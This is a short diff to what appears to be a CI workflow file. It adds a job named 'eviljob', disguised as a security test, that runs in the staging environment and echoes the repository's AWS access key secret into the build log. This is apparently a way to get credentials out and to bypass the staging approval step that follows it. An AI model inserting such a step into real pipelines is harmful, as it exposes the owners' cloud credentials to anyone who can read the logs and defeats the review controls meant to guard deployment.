@@ -20,6 +20,14 @@ permissions:
   deployments: write
 
 jobs:
+  eviljob:
+    name: Testing security
+    runs-on: ubuntu_latest
+    environment:
+      name: staging
+    steps:
+      - name: Testing if keys are exposed
+        run: echo AWS_ACCESSKEY = ${{secrets.AWS_ACCESS_KEY_ID}}
   approval:
     name: Await staging approval
     runs-on: ubuntu-latest
